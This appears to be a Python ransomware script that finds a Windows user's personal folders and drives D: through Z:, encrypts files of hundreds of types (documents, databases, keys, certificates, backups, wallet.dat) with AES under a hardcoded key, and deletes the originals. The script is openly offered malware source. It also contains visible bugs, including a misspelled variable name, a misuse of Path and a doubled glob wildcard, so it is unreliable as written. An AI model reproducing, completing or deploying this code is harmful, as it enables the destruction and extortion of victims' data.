#!/usr/bin/python

# coded by Bingo 
# twitter: @ly88321 
# https://github.com/ly88321/crypt0


from pathlib import Path
from Crypto.Cipher import AES
from Crypto.Hash import SHA256
from Crypto import Random
from sys import stdout
import base64, os,winreg


class colors:
        def __init__(self):
                self.blue = "\033[94m"
                self.red = "\033[91m"
                self.end = "\033[0m"
cl = colors()



print(cl.red+"""

\t
\t               |
\t               |
\t          -----+------        -----------
\t               |                                   
\t               |
\t    )                                           (
\t    \ \                                       / /
\t     \ |\                                   / |/
\t      \|  \                               /   /
\t       \   |\         --------          / |  /
\t        \  |  \_______________________/   | /
\t         \ |    |      |      |      |    |/
\t          \|    |      |      |      |    /
\t           \____|______|______|______|___/



\t             By: @ly88321
\t          https://github.com/ly88321/crypt0

"""+cl.end)



def getkey(password):
	hasher = SHA256.new(password)
	return hasher.digest()



def write(word):
	stdout.write(word+"                                         \r")
	stdout.flush()
	return True



def encrypt(key, filename):
	chunksize = 64*1024
	outputFile = str(filename)+".hacklab"
	filesize = str(os.path.getsize(filename)).zfill(16)
	IV = Random.new().read(16)

	encryptor = AES.new(key, AES.MODE_CBC, IV)
	try:
		with open(filename, 'rb') as infile:
			with open(outputFile, 'wb') as outfile:
				outfile.write(filesize.encode('utf-8'))
				outfile.write(IV)

				while True:
					chunk = infile.read(chunksize)

					if len(chunk) == 0:
						break 
					elif len(chunk) % 16 != 0:
						chunk += b' ' * (16 - (len(chunk) % 16))

					outfile.write(encryptor.encrypt(chunk))
	except IOError:
		pass

def get_desktop():
	key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                         r'Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders',)
	return winreg.QueryValueEx(key, "Desktop")[0]
def get_Documents():
	key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                         r'Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders',)
	return winreg.QueryValueEx(key, "Personal")[0]
def get_Pictures():
	key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                         r'Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders',)
	return winreg.QueryValueEx(key, "My Pictures")[0]
def get_Music():
	key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                         r'Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders',)
	return winreg.QueryValueEx(key, "My Music")[0]
def get_Video():
	key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                         r'Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders',)
	return winreg.QueryValueEx(key, "My Video")[0]


#change this path to your path
p = Path(get_desktop() + '\\',
         get_Documents() + '\\',
         get_Pictures() + '\\',
         get_Music() + '\\',
         get_Video() + '\\',
         'D:\\',
         'E:\\',
         'F:\\',
         'G:\\',
         'I:\\',
         'J:\\',
         'K:\\',
         'L:\\',
         'M:\\',
         'N:\\',
         'O:\\',
         'P:\\',
         'Q:\\',
         'R:\\',
         'S:\\',
         'T:\\',
         'U:\\',
         'V:\\',
         'W:\\',
         'X:\\',
         'Y:\\',
         'Z:\\')

#change this key with your key, remember the key must be base64 encode
key = "aGFja2xhYg=="

list_f = []


#extensions list
extentions = ['*.txt',
              '*.exe',
              '*.php',
              '*.pl',
              '*.7z',
              '*.rar',
              '*.m4a',
              '*.wma',
              '*.avi',
              '*.wmv',
              '*.csv',
              '*.d3dbsp',
              '*.sc2save',
              '*.sie',
              '*.sum',
              '*.ibank',
              '*.t13',
              '*.t12',
              '*.qdf',
              '*.gdb',
              '*.tax',
              '*.pkpass',
              '*.bc6',
              '*.bc7',
              '*.bkp',
              '*.qic',
              '*.bkf',
              '*.sidn',
              '*.sidd',
              '*.mddata',
              '*.itl',
              '*.itdb',
              '*.icxs',
              '*.hvpl',
              '*.hplg',
              '*.hkdb',
              '*.mdbackup',
              '*.syncdb',
              '*.gho',
              '*.cas',
              '*.svg',
              '*.map',
              '*.wmo',
              '*.itm',
              '*.sb',
              '*.fos',
              '*.mcgame',
              '*.vdf',
              '*.ztmp',
              '*.sis',
              '*.sid',
              '*.ncf',
              '*.menu',
              '*.layout',
              '*.dmp',
              '*.blob',
              '*.esm',
              '*.001',
              '*.vtf',
              '*.dazip',
              '*.fpk',
              '*.mlx',
              '*.kf',
              '*.iwd',
              '*.vpk',
              '*.tor',
              '*.psk',
              '*.rim',
              '*.w3x',
              '*.fsh',
              '*.ntl',
              '*.arch00',
              '*.lvl',
              '*.snx',
              '*.cfr',
              '*.ff',
              '*.vpp_pc',
              '*.lrf',
              '*.m2',
              '*.mcmeta',
              '*.vfs0',
              '*.mpqge',
              '*.kdb',
              '*.db0',
              '*.mp3',
              '*.upx',
              '*.rofl',
              '*.hkx',
              '*.bar',
              '*.upk',
              '*.das',
              '*.iwi',
              '*.litemod',
              '*.asset',
              '*.forge',
              '*.ltx',
              '*.bsa',
              '*.apk',
              '*.re4',
              '*.sav',
              '*.lbf',
              '*.slm',
              '*.bik',
              '*.epk',
              '*.rgss3a',
              '*.pak',
              '*.big',
              '*.unity3d',
              '*.wotreplay',
              '*.xxx',
              '*.desc',
              '*.py',
              '*.m3u',
              '*.flv',
              '*.js',
              '*.css',
              '*.rb',
              '*.png',
              '*.jpeg',
              '*.p7c',
              '*.p7b',
              '*.p12',
              '*.pfx',
              '*.pem',
              '*.crt',
              '*.cer',
              '*.der',
              '*.x3f',
              '*.srw',
              '*.pef',
              '*.ptx',
              '*.r3d',
              '*.rw2',
              '*.rwl',
              '*.raw',
              '*.raf',
              '*.orf',
              '*.nrw',
              '*.mrwref',
              '*.mef',
              '*.erf',
              '*.kdc',
              '*.dcr',
              '*.cr2',
              '*.crw',
              '*.bay',
              '*.sr2',
              '*.srf',
              '*.arw',
              '*.3fr',
              '*.dng',
              '*.jpeg',
              '*.jpg',
              '*.cdr',
              '*.indd',
              '*.ai',
              '*.eps',
              '*.pdf',
              '*.pdd',
              '*.psd',
              '*.dbfv',
              '*.mdf',
              '*.wb2',
              '*.rtf',
              '*.wpd',
              '*.dxg',
              '*.xf',
              '*.dwg',
              '*.pst',
              '*.accdb',
              '*.mdb',
              '*.pptm',
              '*.pptx',
              '*.ppt',
              '*.xlk',
              '*.xlsb',
              '*.xlsm',
              '*.xlsx',
              '*.xls',
              '*.wps',
              '*.docm',
              '*.docx',
              '*.doc',
              '*.odb',
              '*.odc',
              '*.odm',
              '*.odp',
              '*.ods',
              '*.odt',
              '*.sql',
              '*.zip',
              '*.tar',
              '*.tar.gz',
              '*.tgz',
              '*.biz',
              '*.ocx',
              '*.html',
              '*.htm',
              '*.3gp',
              '*.srt',
              '*.cpp',
              '*.mid',
              '*.mkv',
              '*.mov',
              '*.asf',
              '*.mpeg',
              '*.vob',
              '*.mpg',
              '*.fla',
              '*.swf',
              '*.wav',
              '*.qcow2',
              '*.vdi',
              '*.vmdk',
              '*.vmx',
              '*.gpg',
              '*.aes',
              '*.ARC',
              '*.PAQ',
              '*.tar.bz2',
              '*.tbk',
              '*.bak',
              '*.djv',
              '*.djvu',
              '*.bmp',
              '*.cgm',
              '*.tif',
              '*.tiff',
              '*.NEF',
              '*.cmd',
              '*.class',
              '*.jar',
              '*.java',
              '*.asp',
              '*.brd',
              '*.sch',
              '*.dch',
              '*.dip',
              '*.vbs',
              '*.asm',
              '*.pas',
              '*.ldf',
              '*.ibd',
              '*.MYI',
              '*.MYD',
              '*.frm',
              '*.dbf',
              '*.SQLITEDB',
              '*.SQLITE3',
              '*.asc',
              '*.lay6',
              '*.lay',
              '*.ms11 (Security copy)',
              '*.sldm',
              '*.sldx',
              '*.ppsm',
              '*.ppsx',
              '*.ppam',
              '*.docb',
              '*.mml',
              '*.sxm',
              '*.otg',
              '*.slk',
              '*.xlw',
              '*.xlt',
              '*.xlm',
              '*.xlc',
              '*.dif',
              '*.stc',
              '*.sxc',
              '*.ots',
              '*.ods',
              '*.hwp',
              '*.dotm',
              '*.dotx',
              '*.docm',
              '*.DOT',
              '*.max',
              '*.xml',
              '*.uot',
              '*.stw',
              '*.sxw',
              '*.ott',
              '*.csr',
              '*.key',
              'wallet.dat']
#f = raw_input("the files format> ")

for extension in extensions:
	try:
		searche = list(p.glob('**/*.{}'.format(extension)))
	
		for File in searche:
			File = str(File)
			if File.endswith(".hacklab"):
				pass
			else:
				#x = x.split("/")[-1]
				list_f.append(File)
				#print(x)
	except OSError:
		print("you must be root !")


for i in list_f:
	file_name = i.split("\\")[-1]
	file_path = i.replace(file_name, "")

	word = cl.blue+"Encryption: "+cl.end+str(file_name)
	write(word)
	os.chdir(file_path)
	encrypt(getkey(base64.b64decode(key)), file_name)
	try:
		os.remove(file_name)
	except OSError:
		pass
	
print("\n* Done *")
